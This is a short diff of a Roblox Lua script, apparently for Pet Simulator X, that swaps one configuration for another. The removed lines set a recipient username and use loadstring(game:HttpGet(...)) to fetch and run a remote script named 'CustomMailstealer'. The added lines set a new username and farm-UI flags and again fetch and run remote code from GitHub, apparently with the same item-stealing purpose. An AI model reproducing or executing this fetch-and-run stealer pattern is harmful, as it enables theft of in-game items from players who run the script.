@@ -1,5 +1,4 @@
-Username = "Yrotnme"
-G_LoadingScreen = ""
-G_Mailmessage = "succes"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
+Username = "acctrymail"
+loadingscreen = false 
+farmui = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
